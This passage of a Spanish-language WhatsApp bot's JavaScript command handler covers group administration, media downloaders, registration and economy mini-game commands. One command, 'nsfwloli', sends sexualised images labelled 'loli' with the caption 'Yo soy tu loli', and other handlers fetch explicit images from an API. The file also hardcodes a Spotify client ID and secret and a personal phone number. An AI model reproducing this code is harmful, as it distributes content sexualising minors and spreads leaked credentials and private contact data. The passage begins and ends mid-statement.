  global.db.data.chats[m.chat].detect = false  
  global.db.data.chats[m.chat].antilink = false  
  global.db.data.chats[m.chat].audios = false  
  global.db.data.chats[m.chat].welcome = false  
  global.db.data.chats[m.chat].modeadmin = false  
  global.db.data.chats[m.chat].antifake = false  
  global.db.data.chats[m.chat].antiarabe = false  
  reply(`*${command} desactivado!*`)}}  
  case 'modojadibot':  
  case 'anticall':   
  if (!isCreator) return reply(info.owner)  
  if (args[0] === "on") {  
  if (db.data.chats[m.chat].modojadibot)  
  if (db.data.settings[numBot].anticall)  
  db.data.chats[m.chat].modojadibot = true  
  db.data.settings[numBot].anticall = true  
  reply(`*✅El ${command} se activo con exito*`)  
  } else if (args[0] === "off") {  
  if (db.data.chats[m.chat].modojadibot)  
  if (db.data.settings[numBot].anticall)  
  db.data.settings[numBot].anticall = false  
  db.data.chats[m.chat].modojadibot = false  
  reply(`*${command} desactivado!*`)}  
  break  
  
  case 'join': {  
  if (!isCreator) return reply(info.owner)  
  if (!text) return reply(`*Y EL LINK DEL GRUPO?*`)  
  if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply(`*Link incorrecto!*`)  
  reply(`*YA ME UNISTE ✳️*`)  
  let result = args[0].split('https://chat.whatsapp.com/')[1]  
  await conn.groupAcceptInvite(result).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))}  
  break  
  
  case 'hidetag': {  
  if (!m.isGroup) return reply(info.group)   
  if (!isBotAdmins) return reply(info.botAdmin)  
  if (!isGroupAdmins) return reply(info.admin)  
  if (!q) return reply(`*Y el texto?*`)  
  conn.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })}  
  break   
  
  case 'leave': {  
  if (!isCreator) return reply(info.owner)  
  reply(m.chat, `*Adios fue un gusto estar aqui hasta pronto 👋*`)  
  await conn.groupLeave(m.chat)}  
  break  
  
  case 'setppname': case 'nuevonombre': case 'newnombre': {  
  if (!m.isGroup) return reply(info.group)   
  if (!isBotAdmins) return reply(info.botAdmin)  
  if (!isGroupAdmins) return reply(info.admin)  
  if (!text) return reply('*⚠️ Ingresa el texto*')  
  await conn.groupUpdateSubject(m.chat, text)  
  await reply(`*✅El nombre del grupo se cambio correctamente*`)}  
  break  
  case 'setdesc': case 'descripción': {  
  if (!m.isGroup) return reply(info.group)   
  if (!isBotAdmins) return reply(info.botAdmin)  
  if (!isGroupAdmins) return reply(info.admin)  
  if (!text) return reply('*⚠️ Ingresa el texto*')  
  await conn.groupUpdateDescription(m.chat, text)  
  await reply(`*✅La descripción del grupo se cambio con éxito*`)}  
  break  
  case 'setppgroup': case 'setpp': {  
  if (!m.isGroup) return reply(info.group)   
  if (!isBotAdmins) return reply(info.botAdmin)  
  if (!isGroupAdmins) return reply(info.admin)  
  if (!quoted) return reply(`*⚠️Y la imagen?*`)  
  if (!/image/.test(mime)) return reply(`*⚠️ Responde a una con:* ${prefix + command}`)  
  if (/webp/.test(mime)) return reply(`*⚠️Responde a una  Image con :* ${prefix + command}`)  
  var mediz = await conn. downloadAndSaveMediaMessage(quoted, 'ppgc.jpeg')  
  if (args[0] == `full`) {  
  var { img } = await generateProfilePicture(mediz)  
  await conn.query({tag: 'iq', attrs: {to: m.chat, type:'set', xmlns: 'w:profile:picture' }, content: [ {tag: 'picture', attrs: { type: 'image' }, content: img } ]})   
  fs.unlinkSync(mediz)  
  reply(`*✅Exito*`)  
  } else {  
  var memeg = await conn.updateProfilePicture(m.chat, { url: mediz })  
  fs.unlinkSync(mediz)  
  reply(`*✅Exito*`)}}  
  break  
  
  case 'add': {  
  if (global.db.data.users[m.sender].registered < true) return reply(info.registra)  
  if (!m.isGroup) return reply(info.group);    
  if (!isBotAdmins) return reply(info.botAdmin)  
  if (!isGroupAdmins) return reply(info.admin)  
  if (!isCreator) return reply(info.owner)  
  if (!text) return reply(`*[ ⚠️ ] INGRESA EL NÚMERO DE LA PERSONA QUE QUIERA AGREGAR*\n*EJEMPLO:*\n${prefix}add +5244446577`)  
  if (text.includes('+')) return reply(`*⚠️ INGRESA EL NUMERO SIN EL (+)*`)  
  let group = m.chat  
  let link = 'https://chat.whatsapp.com/' + await conn.groupInviteCode(group)  
  await conn.sendMessage(text+'@s.whatsapp.net', {text: `≡ *INVITACIÓN*\n\nHola un usuario te invito a unirte a este grupo\n\n${link}`, mentions: [m.sender]})  
  reply(`*✅Listo*`)}  
  break  
  
  case 'kick': {  
  if (!m.isGroup) return reply(info.group)   
  if (!isBotAdmins) return reply(info.botAdmin)  
  if (!isGroupAdmins) return reply(info.admin)  
  if (!m.quoted) return reply(`[ ⚠️ ] A QUIEN CARAJO ELIMINO? ETIQUETA ALGUN USUARIO NO SOY ADIVINO tilin 😐`)  
  let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'  
  conn.groupParticipantsUpdate(m.chat, [users], 'remove')}  
  break  
  
  case 'promote': {  
  if (!m.isGroup) return reply(info.group)   
  if (!isBotAdmins) return reply(info.botAdmin)  
  if (!isGroupAdmins) return reply(info.admin)  
  if (!m.quoted) return reply(`*[ ⚠️ ] A QUIEN LE DOY ADMIN? ETIQUETA A LA PERSONA O RESPONDE A SUS MENSAJES*`)  
  let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'  
  await conn.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))  
  }  
  break  
  
  case 'demote': {  
  if (!m.isGroup) return reply(info.group)   
  if (!isBotAdmins) return reply(info.botAdmin)  
  if (!isGroupAdmins) return reply(info.admin)  
  if (!m.quoted) return reply(`*[ ⚠️ ] A QUIEN LE QUITO ADMINS? ETIQUETA A LA PERSONA O RESPONDE A SUS MENSAJES*`)  
  let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'  
  await conn.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))  
  }  
  break  
  
  case 'link': case 'linkgc': {  
  if (global.db.data.users[m.sender].registered < true) return reply(info.registra)  
  if (!m.isGroup) return reply(info.group)   
  if (!isBotAdmins) return reply(info.botAdmin)  
  let response = await conn. groupInviteCode(m.chat)  
  conn.sendText(m.chat, `https://chat.whatsapp.com/${response}`, m, { detectLink: true })}  
  break  
  

  case 'block': case 'bloquear': {  
  if (!isCreator) return reply(info.owner)  
  reply(`*El usuario fue bloqueado del bot*`)  
  let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'  
  await conn.updateBlockStatus(users, 'block')}  
  break  


  case 'unblock': case 'desbloquear': {  
  if (!isCreator) return reply(info.owner)  
  reply(`*El usuario fue desbloqueado*`)  
  let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'  
  await conn.updateBlockStatus(users, 'unblock')}  
  break
 /* case 'kill2':
//const pm2 = require('pm2');
if (!isCreator) return reply(info.owner)
                  const pm2 = `pm2 kill`
                   reply('A mimir...')
	               exec(pm2, (err, stdout) => {
		           if(err) return conn.sendMessage(from, {text: "Comando inexistente"}, {quoted: m})

		           if (stdout) {
			       conn.sendMessage(from, stdout, text, {quoted: mek})
} 
                   })
                  break*/
  case 'banchat': {  
  if (!m.isGroup) return reply(info.group)   
  if (!isBotAdmins) return reply(info.botAdmin)  
  if (!isGroupAdmins) return reply(info.admin)  
  if (!text) return reply(`*Accion mal usaba*\n\n*Use de esta forma:*\n*${prefix + command} on*\n*${prefix + command} off*`)  
  if (args[0] === "on") {  
  if (db.data.chats[m.chat].ban) return reply(`*Ya esta baneado este chat*`)  
  db.data.chats[m.chat].ban = true  
  reply(`*BOT OFF*`)  
  } else if (args[0] === "off") {  
  if (!db.data.chats[m.chat].ban) return reply(`*Este chat ya esta desbaneado*`)  
  db.data.chats[m.chat].ban = false  
  reply(`*BOT ONLINE YA ESTOY DISPONIBLE ✅*`)}}  
  break  
  
  case 'tagall': {  
  if (global.db.data.users[m.sender].registered < true) return reply(info.registra)  
  if (!m.isGroup) return reply(info.group)   
  if (!isBotAdmins) return reply(info.botAdmin)  
  if (!isGroupAdmins) return reply(info.admin)  
  let teks = `❑ ━〔 *📢 ＩＮＶＯＣＡＣＩＯ́Ｎ 📢* 〕━ ❑\n\n`  
  teks += `❑ Mensaje:  ${q ? q : 'Active perra'}\n\n`  
  for (let mem of participants) {  
  teks += `➥ @${mem.id.split('@')[0]}\n`  
  }  
  conn.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })  
  }  
  break  
  
  case 'ping':    
  if (global.db.data.users[m.sender].registered < true) return reply(info.registra)  
  var timestamp = speed();    
  var latensi = speed() - timestamp    
  conn.sendMessage(from, { text: `*Pong 🏓  ${latensi.toFixed(4)}*` }, { quoted: msg });    
  break                    
  
  case 'report': {  
  if (global.db.data.users[m.sender].registered < true) return reply(info.registra)  
  if (!text) return reply(`*𝙸𝙽𝙶𝚁𝙴𝚂𝙴 𝙴𝙻 𝙲𝙾𝙼𝙰𝙽𝙳𝙾 𝙲𝙾𝙽 𝙵𝙰𝙻𝙻𝙾𝚂*\n\n*𝙴𝙹𝙴𝙼𝙿𝙻𝙾:*\n${prefix + command} sticker no funciona`)  
  conn.sendMessage(`584125778026@s.whatsapp.net`, {text: `╭━━〔 *𝚁𝙴𝙿𝙾𝚁𝚃𝙴 | 𝚁𝙴𝙿𝙾𝚁𝚃 * 〕━━⬣\n┃\n┃✿ *𝙽𝚞𝚖𝚎𝚛𝚘 | 𝚗𝚞𝚖𝚋𝚎𝚛*\n┃⇢ wa.me/${m.sender.split("@")[0]}\n┃\n┃✿ *𝙼𝚎𝚗𝚜𝚊𝚓𝚎 | 𝚝𝚎𝚡𝚝*\n┃: ${text}┃\n╰━━━〔 *${vs}* 〕━━━⬣` })  
  reply(`*𝙴𝙻 𝚁𝙴𝙿𝙾𝚁𝚃𝙴 𝙵𝚄𝙴 𝙴𝙽𝚅𝙸𝙰𝙳𝙾 𝙰 𝙼𝙸 𝙲𝚁𝙴𝙰𝙳𝙾𝚁, 𝙽𝙾𝚂 𝙲𝙾𝙽𝚃𝙰𝚁𝙴𝙼𝙾𝚂 𝙲𝙾𝙽 𝚄𝚂𝚃𝙴𝙳 𝚂𝙸 𝙴𝚂 𝙽𝙴𝙲𝙴𝚂𝙰𝚁𝙸𝙾, 𝙳𝙴 𝚂𝙴𝚁 𝙵𝙰𝙻𝚂𝙾 𝚂𝙴𝚁𝙰 𝙸𝙶𝙽𝙾𝚁𝙰𝙳𝙾 𝚈 𝙱𝙻𝙾𝚀𝚄𝙴𝙰𝙳𝙾 𝙳𝙴𝙻 𝙱𝙾𝚃*`)}  
  break   
  
  case "tts":  
  if (global.db.data.users[m.sender].registered < true) return reply(info.registra)  
  if (!q) return reply("*Y EL TEXTO?*")  
  await conn.sendPresenceUpdate('recording', m.chat)  
  let texttosay = text  
  ? text  
  : m.quoted && m.quoted.text  
  ? m.quoted.text  
  : m.text;  
  const SpeakEngine = require("google-tts-api");   
  const texttospeechurl = SpeakEngine.getAudioUrl(texttosay, {lang: "es", slow: false, host: "https://translate.google.com",});  
  conn.sendMessage(m.chat, { audio: { url: texttospeechurl }, contextInfo: { "externalAdReply": { "title": botname, "body": ``, "previewType": "PHOTO", "thumbnailUrl": null,"thumbnail": imagen1, "sourceUrl": md, "showAdAttribution": true}}, seconds: '4556', ptt: true, mimetype: 'audio/mpeg', fileName: `error.mp3` }, { quoted: m })  
  break                  
  
  case "a":  
  if (!global.db.data.chats[m.chat].audios) return  
  let vn = './media/a.mp3'  
  await conn.sendPresenceUpdate('recording', m.chat)  
  conn.sendMessage(m.chat, { audio: { url: vn }, contextInfo: { "externalAdReply": { "title": botname, "body": ``, "previewType": "PHOTO", "thumbnailUrl": null,"thumbnail": imagen1, "sourceUrl": md, "showAdAttribution": true}}, seconds: '4556', ptt: true, mimetype: 'audio/mpeg', fileName: `error.mp3` }, { quoted: m })  
  break  
  
  case 'simi': case 'bot': {  
     if (global.db.data.users[m.sender].registered < true) return reply(info.registra)  
  if (!text) return conn.sendMessage(from, { text: `*INGRESE UN TEXTO PARA HABLAR CONMIGO*`}, { quoted: msg })  
await conn.sendPresenceUpdate('composing', m.chat) 
 let anu = await fetchJson(`https://api.simsimi.net/v2/?text=${text}&lc=es&cf=false`) 
 let res = anu.success; 
 m.reply(res)}

  break   
 case 'ia': case 'chatgpt': 
 await ia(conn, m, text, quoted) 
 break
  case 'gay': {  
 await game1(conn, m, text, participants, sender)} 
 break            
  case 'pareja':  
  if (global.db.data.users[m.sender].registered < true) return reply(info.registra)  
  if (!m.isGroup) return reply(info.group)   
  let member = participants.map(u => u.id)  
  let me = m.sender  
  let jodoh = member[Math.floor(Math.random() * member.length)]  
  let love = member[Math.floor(Math.random() * member.length)]  
  conn.sendMessage(m.chat, { text: `*Te deberias casar con @${love.split('@')[0]} hacen una bonita pareja 💕*`,  
  contextInfo:{  
  mentionedJid:[me, love],  
  forwardingScore: 9999999,  
  isForwarded: true,   
  "externalAdReply": {  
  "showAdAttribution": true,  
  "containsAutoReply": true,  
  "title": ` ${botname}`,  
  "body": `${pushname}`,  
  "previewType": "PHOTO",  
  "thumbnailUrl": ``,  
  "thumbnail": imagen1,   
  "sourceUrl": md}}},  
  { quoted: m})  
  break  
  
  case 'fake': {
await fakechat(conn, text, prefix, command, body, from, m, sender, quoted)}
  break  
  
  case 'hentai':  
  if (global.db.data.users[m.sender].registered < true) return reply(info.registra)  
  if (!m.isGroup) return reply(info.group)   
  if (!global.db.data.chats[m.chat].antiNsfw) return reply(info.nsfw)  
  var hentai = JSON.parse(fs.readFileSync('./src/nsfw/neko.json'))  
  var hentairesult = pickRandom(hentai)  
  conn.sendMessage(m.chat, { caption: `🥵`, image: { url: hentairesult.url } }, { quoted: m })  
  break  
  case 'nsfwloli':  
  if (global.db.data.users[m.sender].registered < true) return reply(info.registra)  
  if (!m.isGroup) return reply(info.group)   
  if (!global.db.data.chats[m.chat].antiNsfw) return reply(info.nsfw)  
  var nsfw = JSON.parse(fs.readFileSync('./src/nsfw/nsfwloli.json'))  
  var result = pickRandom(nsfw)  
  conn.sendMessage(m.chat, { caption: 'Yo soy tu loli 🥵', image: { url: result.url } }, { quoted: m })  
  break  
  case 'lewd': case 'feed': case 'gasm': case 'anal': case 'holo': case 'tits': case 'kuni': case 'kiss': case 'erok': case 'smug': case 'solog': case 'feetg': case 'lewdk': case 'waifu': case 'pussy': case 'femdom': case 'cuddle': case 'eroyuri': case 'cum_jpg': case 'blowjob': case 'holoero': case 'erokemo': case 'fox_girl': case 'futanari': case 'wallpaper':  
  if (global.db.data.users[m.sender].registered < true) return reply(info.registra)  
  if (!m.isGroup) return reply(info.group)   
  if (!global.db.data.chats[m.chat].antiNsfw) return reply(info.nsfw)  
  sendImageAsUrl(`https://api.lolhuman.xyz/api/random2/${command}?apikey=${lolkeysapi}`, `*🔥 ${command} 🔥*`)  
  break  
  case 'spotifydl':case 'spotify': { 
 const Spotify = require('spotifydl-x'); 
 const fs = require('fs') 
 const fetch= require('node-fetch'); 
 const NodeID3 = require('node-id3'); 
 const credentials = {  
    clientId: 'acc6302297e040aeb6e4ac1fbdfd62c3',  
    clientSecret: '0e8439a1280a43aba9a5bc0a16f3f009',  
  };  
  const spotify = new Spotify.default(credentials);   
   if (!text) return reply(`*[❗] Ingrese el nombre de alguna canción de spotify.*`); 
 try { 
      const resDL = await fetch(`https://api.lolhuman.xyz/api/spotifysearch?apikey=${lolkeysapi}&query=${text}`);  
      const jsonDL = await resDL.json();  
      const linkDL = jsonDL.result[0].link;  
      const spty = await spotifydl(linkDL);  
      const getRandom = (ext) => {  
        return `${Math.floor(Math.random() * 10000)}${ext}`;  
      };  
      const randomName = getRandom('.mp3');  
      const filePath = `./tmp/${randomName}`;  
      const artist = spty.data.artists.join(', ') || '-';  
      const img = await (await fetch(`${spty.data.cover_url}`)).buffer()    
  
  
  
 const letra = '\n\n🤴🏻 Descarga por DIEGO-OFC & TheShadow-Bot-MD🤖' 
  
      const tags = {  
        title: spty.data.name || '-',  
        artist: artist,  
        album: spty.data.album_name || '-',  
        year: spty.data.release_date || '-',  
        genre: 'Música',  
        comment: {  
          language: 'spa',  
          text: letra,  
        },  
        unsynchronisedLyrics: {  
          language: 'spa',  
          text: letra,  
        },  
        image: {  
          mime: 'image/jpeg',  
          type: {  
            id: 3,  
            name: 'front cover',  
          },  
          description: 'Spotify Thumbnail',  
          imageBuffer: await axios.get(spty.data.cover_url, {responseType: "arraybuffer"}).then((response) => Buffer.from(response.data, "binary")),  
        },  
        mimetype: 'image/jpeg',  
        copyright: 'Copyright Darlyn ©2023',  
      };  
      await fs.promises.writeFile(filePath, spty.audio);  
      await NodeID3.write(tags, filePath);  
      let spotifyi = `*• 💽 Spotify Download •*\n\n`  
           spotifyi += `        ◦  *Título:* ${spty.data.name}\n`  
           spotifyi += `        ◦  *Artista:* ${spty.data.artists}\n`  
           spotifyi += `        ◦  *Album:* ${spty.data.album_name}\n`                   
           spotifyi += `        ◦  *Publicado:* ${spty.data.release_date}\n\n`     
           spotifyi += `El audio se esta enviando, espere un momento..`  
      await conn.sendMessage(m.chat, {text: spotifyi.trim(), contextInfo: {forwardingScore: 9999999, isForwarded: true, "externalAdReply": {"showAdAttribution": true, "containsAutoReply": true, "renderLargerThumbnail": true, "title": global.titulowm2, "containsAutoReply": true, "mediaType": 1, "thumbnail": img, "thumbnailUrl": img, "mediaUrl": linkDL, "sourceUrl": linkDL}}}, {quoted: m});  
      await conn.sendMessage(m.chat, {audio: fs.readFileSync(`./tmp/${randomName}`), fileName: `${spty.data.name}.mp3`, mimetype: 'audio/mpeg'}, {quoted: m});  
    } catch (error) {  
      console.error(error);  
      return reply('*[❗] Error, no se encontraron resultados.*') 
    }  
  }; 
 break 
   case 'mega': 
         if (!text) return reply(`ejemplo:\n${prefix + command} https://mega.nz/file/0FUA2bzb#vSu3Ud9Ft_HDz6zPvfIg_y62vE1qF8EmoYT3kY16zxo`) 
         var file = File.fromURL(text) 
         await file.loadAttributes() 
  if (file.size >= 500000000) return reply('Minimum Size: 500MB', 'Error: file size is too large ') 
  
         reply(`*_Please wait a few minutes..._*`, file.name, 'downloading...') 
         const data = await file.downloadBuffer() 
         if (/mp4/.test(data)) { 
           await conn.sendMessage(from, { document: data, mimetype: "video/mp4", fileName: `${file.name}.mp4` }, { quoted: msg }) 
         } else if (/pdf/.test(data)) { 
           await conn.sendMessage(from, { document: data, mimetype: "application/pdf", fileName: `${file.name}.pdf` }, { quoted: msg }) 
         } 
         break        
  case 'mediafire': { 
  
 if (!text) return reply(`*Ingresa el enlace, ejemplo ${prefix + command} https://www.mediafire.com/file/admrdma1ff3cq10/Siete-Ocho.zip/file`)  
 if (global.db.data.users[m.sender].dolares < 1) return reply(info.sindolares)  
 const baby1 = await mediafireDl(text) 
 if (baby1[0].size.split('MB')[0] >= 1500) return reply('minimo 900 MB ' + util.format(baby1)) 
 const result4 = `  
  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  
      ⟮ _*◉Mᴇᴅɪᴀꜰɪʀᴇ Dᴏᴡɴʟᴏᴀᴅ◉*_ ⟯   
              
  *NAME* : ${baby1[0].nama}  
  *SIZE* : ${baby1[0].size}  
  *MIME* : ${baby1[0].mime}  
  *LINK* : ${baby1[0].link}\n  
    
   _scraping metadata...._   
  *${botname}*`  
  reply(`${result4}`)  
  conn.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime ,  quoted : m, contextInfo: { externalAdReply:{  
    title:"Shadow-Bot-ᴠ5",  
    body:"Entra a mi web ofc",  
    showAdAttribution: true,  
    mediaType:2,  
    thumbnail: fs.readFileSync(`./media/menu.jpg`) ,  
    mediaUrl:`https://web-shadow.vercel.app/`,   
  sourceUrl: `https://web-shadow.vercel.app/` }}}, {quoted: m}) 
  db.data.users[m.sender].dolares -= 8
  reply(info.dolares8) 
  } 
  break  
 case 'ytplay': { 
   if (!text) return reply(`example:\n${prefix + command} kokoronashi`) 
   const ytplay = await youtube.search(text) 
   try { 
     const data = await youtubedl(ytplay[6].url) 
     const url2 = await data.audio.getUrl({format: '128kbps'}) 
     const hasil = await getBuffer(url2) 
     await conn.sendMessage(from, { 
       document: hasil, 
       mimetype: "audio/mp4", 
       fileName: `${data.title}.mp3`, 
       jpegThumbnail: fs.readFileSync('./media/menu1.jpg'), 
     }, { quoted: msg }) 
     await conn.sendMessage(from, { audio: hasil, mimetype: "audio/mp4" }, { quoted: msg }) 
   } catch (err) { 
     return reply(err.message) 
   }} 
   break 
  
  case 'ytmp4': case 'ytvideo': {

if (!text) return reply('*ingrese un link?*');
reply(`enviando video, porfavor espera :D`)
const url = `https://xanax-apis.online/youtube/mp4?url=${text}&apitoken=${xanax}`      
conn.sendMessage(from, { video: { url: url}, mimetype: 'video/mp4', fileName: `Shadow.mp4` }, { quoted: m })}
break 

 case 'apk': case 'modapk': {
 aptoide(conn, m, text, args, command)}
  break
  case 'gitclone':  
  if (global.db.data.users[m.sender].registered < true) return reply(info.registra)  
  if (!args[0]) return reply(`*Ejemplo :*\n${prefix + command} ${md}`)  
  if (!isUrl(args[0]) && !args[0].includes('github.com')) return reply(`Link invalido!!`)  
  conn.sendMessage(from, { text: `*𝘈𝘎𝘜𝘈𝘙𝘋𝘌 𝘜𝘕 𝘔𝘖𝘔𝘌𝘕𝘛𝘖...*\n\nˢᶦ ᵉˡ ᵃʳᶜʰᶦᵛᵒ ⁿᵒ ˡˡᵉᵍᵃ ᵉˢ ᵠᵘᵉ ʳᵉᵖᵒˢᶦᵗᵒʳᶦᵒ ᵉˢ ᵐᵘʸ ᵖᵉˢᵃᵈᵒ` }, { quoted: m })  
  let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i  
  let [, user, repo] = args[0].match(regex1) || []  
  repo = repo.replace(/.git$/, '')  
  let url = `https://api.github.com/repos/${user}/${repo}/zipball`  
  let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]  
  conn.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply(info.error))  
  db.data.users[m.sender].limit -= 1  
  reply(info.limit)   
  break  
  
  case 'tiktok':  
  if (global.db.data.users[m.sender].registered < true) return reply(info.registra)  
  if (!text) return m.reply( `*Ejemplo:* ${prefix + command} https://vm.tiktok.com/ZMjdrFCtg/`)  
  if (!q.includes('tiktok')) return m.reply(`*link invalido!*`)  
  //await loading ()  
  conn.fakeReply(m.chat, `⏳ *Aguarde un momento....*`, '0@s.whatsapp.net', 'No haga spam')  
  require('./libs/tiktok').Tiktok(q).then( data => {  
  conn.sendMessage(m.chat, { video: { url: data.nowm }}, { quoted: m })  
  conn.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })})  
  db.data.users[m.sender].limit -= 1  
  reply(info.limit)   
  break  
  
 /* case 'lyrics': case 'letra': {  
  if (global.db.data.users[m.sender].registered < true) return reply(info.registra)  
  if (!text) return reply(`*Que esta buscado? ingresa el titulo/nombre de la canción*\n*Ejemplo:* ${prefix + command} ozuna`)  
  const { lyrics, lyricsv2 } = require('@bochilteam/scraper')  
  const result = await lyricsv2(text).catch(async _ => await lyrics(text))  
  conn.editMessage(m.chat, '*Aguarde un momento....*', `*❏ Titulo:* ${result.title}\n*❏ Autor :* ${result.author}\n*❏ Url :* ${result.link}\n\n*❏ Letra :* ${result.lyrics}`, 3, fkontak)  
  db.data.users[m.sender].limit -= 1  
  reply(info.limit)}  
  break */ 
  
  case 'ss': case 'ssweb': {  
  if (global.db.data.users[m.sender].registered < true) return reply(info.registra)  
  if (!q) return reply(`*Ejemplo:* ${prefix+command} link`)  
  conn.fakeReply(m.chat, `⏳ *Aguarde un momento....*`, '0@s.whatsapp.net', 'No haga spam')  
  let krt = await scp1.ssweb(q)  
  conn.sendMessage(from, {image:krt.result, caption: info.result}, {quoted:m})}  
  break  
  
  case 'reg': {  
  let Reg = /\|?(.*)([.|] *?)([0-9]*)$/i  
  let user = global.db.data.users[m.sender]  
  if (user.registered === true) return reply(`*Ya estas registrado 🧐*`)   
  if (!Reg.test(text)) return reply(`*❎ Incorrecto*\nUse de esta forma\nEjemplo: ${prefix}reg nombre.edad`)   
  let [_, name, splitter, age] = text.match(Reg)  
  if (!name) return reply('El nombre no puede estar vacio')   
  if (!age) return reply('La edad no puede esta vaciar (Numeros)')   
  age = parseInt(age)  
  if (age > 100) return reply('Que viejo (。-`ω´-)')   
  if (age < 5) return reply('🚼  Basado, los bebes saben escribir.✍️😳')   
  if (name.length >= 30) return reply('🐈 Fua que basado, el nombre es muy largo que quiere un puente como nombre😹')   
  user.name = name.trim()  
  user.age = age  
  user.regTime = + new Date  
  user.registered = true  
  // let sn = createHash('md5').update(m.sender).digest('hex')  
  let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : m.fromMe ? conn.user.jid : m.sender  
  const date = moment.tz('America/Bogota').format('DD/MM/YYYY')  
  const time = moment.tz('America/Argentina/Buenos_Aires').format('LT')  
  global.db.data.users[m.sender].limit += 2  
  global.db.data.users[m.sender].exp += 200  
  conn.sendMessage(m.chat, { text: `*[ ✅ REGISTRO COMPLETADO ]*\n◉ *Nombre:* ${name}\n◉ *Edad:* ${age}\n◉ *Hora:* ${time}\n◉ *Fecha:* ${date}\n◉ *Número:* wa.me/${sender.split("@")[0]}\n\n🎁 Recompensa\n◉ 2 diamante 💎\n◉ 200 exp\n\n*Para ver los comandos del bot usar:*\n\n${prefix}menu`,  
  contextInfo:{  
  mentionedJid:[name],  
  forwardingScore: 9999999,  
  isForwarded: true,   
  "externalAdReply": {  
  "showAdAttribution": true,  
  "containsAutoReply": true,  
  "title": `${botname}`,  
  "body": `${name}`,  
  "previewType": "PHOTO",  
  "thumbnailUrl": ``,  
  "thumbnail": imagen1,   
  "sourceUrl": md}}},  
  { quoted: m})}  
  break              
  
  case 'afk': {  
  if (global.db.data.users[m.sender].registered < true) return reply(info.registra)  
  let user = global.db.data.users[m.sender]  
  user.afkTime = + new Date  
  user.afkReason = text  
  m.reply(`╭━─━─━─≪ 𝙰𝙺𝙵 ≫─━─━─━╮  
  ┃ 𝙴𝚂𝚃𝙴 𝚄𝚂𝚄𝙰𝚁𝙸𝙾 ${pushname}.  
  ┃ 😴 𝙴𝚂𝚃𝙰 𝙸𝙽𝙰𝙲𝚃𝙸𝚅𝙾.   
  ┃ ≋≋≋≋≋≋≋≋≋≋≋≋≋≋≋≋≋≋≋≋≋≋  
  ┃ 💤 𝙽𝙾 𝙻𝙾 𝙴𝚃𝙸𝚀𝚄𝙴𝚃𝙴N 💤  
  ┃ ☣️ 𝙼𝙾𝚃𝙸𝚅𝙾 : ${text ? text : ''}  
  ╰━─━─━─≪ ${vs} ≫─━─━─━╯`)}  
  break               
  
  case 'buy': {  
  await buy(conn, m, sender, args, command, text, fkontak)} 
 break
  case 'beg': case 'mendigar': { 
  let d = Math.floor(Math.random() * 10);  
  let time = global.db.data.users[m.sender].lastbeg + 1800000;  
    if (new Date() - global.db.data.users[m.sender].lastbeg < 1800000) return reply( `*𝙴𝚜𝚝𝚊𝚜 𝚌𝚊𝚗𝚜𝚊𝚍𝚘, 𝚍𝚎𝚋𝚎𝚜 𝚍𝚎𝚜𝚌𝚊𝚗𝚜𝚊𝚛 𝚌𝚘𝚖𝚘 𝚖𝚒𝚗𝚒𝚖𝚘 ${msToTime(time - new Date())} 𝚙𝚊𝚛𝚊 𝚟𝚘𝚕𝚟𝚎𝚛 𝚊 mendigar!*`);  
    m.reply(`*${pickRandom(global.beg)} $${d}* *DOLARES*`);  
    global.db.data.users[m.sender].dolares += d * 1; global.db.data.users[m.sender].lastbeg = new Date() * 1;  
  }; 
 break 
  case 'minar': case 'mine':  
  await mine(conn, m, sender, fkontak) 
 break 
  case 'work': case 'trabajar': case 'chambear':  {    
   await work(conn, m, sender, fkontak)} 
 break
case 'rob': case 'robar': {  
 await rob(conn, m, sender, fkontak)} 
 break
  case 'crime': case 'crimen': {  
  let time = global.db.data.users[m.sender].lasCrime + 7200000;   
     if (new Date() - global.db.data.users[m.sender].lasCrime < 7200000)   
       return reply(`*𝙴𝚜𝚝𝚊𝚜 𝚌𝚊𝚗𝚜𝚊𝚍𝚘, 𝚍𝚎𝚋𝚎𝚜 𝚍𝚎𝚜𝚌𝚊𝚗𝚜𝚊𝚛 𝚌𝚘𝚖𝚘 𝚖𝚒𝚗𝚒𝚖𝚘 ${msToTime(time - new Date())} 𝚙𝚊𝚛𝚊 𝚟𝚘𝚕𝚟𝚎𝚛 𝚊 cometer un crimen!*`);   
     let result = Math.floor(Math.random() * 10);   
     let reward = Math.floor(Math.random() * 20);   
     if (result > 6) {   
       m.reply(`Tu robo resultó exitoso; de una manera u otra, obtuviste: $${reward} *DOLARES*`);   
       global.db.data.users[m.sender].dolares += reward * 1;   
       global.db.data.users[m.sender].lasCrime = new Date() * 1;   
     } else {   
       m.reply(   
         `¡Tu intento de robo se vio frustrado cuando la policía confiscó lo que habías tomado y te impuso una comisión equivalente a la mitad del dinero robado por tu liberación! Te quitaron: $${   
